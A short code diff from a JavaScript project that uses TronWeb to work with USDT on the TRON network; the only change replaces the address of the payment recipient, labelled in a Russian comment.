@@ -7,7 +7,7 @@ import { Buffer } from 'buffer';
 window.Buffer = Buffer; // <== Фикс ошибки "Buffer is not defined"
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n'; // <-- получатель
+const TRON_RECEIVER = 'TGAMnB7DDQhrs5RoA7UzRBqZgUX9dkS8C6'; // <-- получатель
 
 const tronWeb = new TronWeb({
   fullHost: 'https://api.trongrid.io',
